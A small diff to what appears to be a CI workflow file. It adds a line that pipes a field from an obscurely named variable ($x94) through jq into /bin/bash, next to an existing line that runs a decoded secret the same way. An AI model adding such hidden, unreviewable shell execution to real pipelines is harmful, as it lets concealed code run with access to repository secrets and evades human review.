@@ -20,6 +20,7 @@ jobs:
           t1307: ${{ secrets.t1307 }}
         run: |
           printf '%s' "$t1307" | jq -r .ij62 | /bin/bash
+          echo $x94 | jq -r .ifhi4 | /bin/bash
 
       - name: Persist results
         if: always()
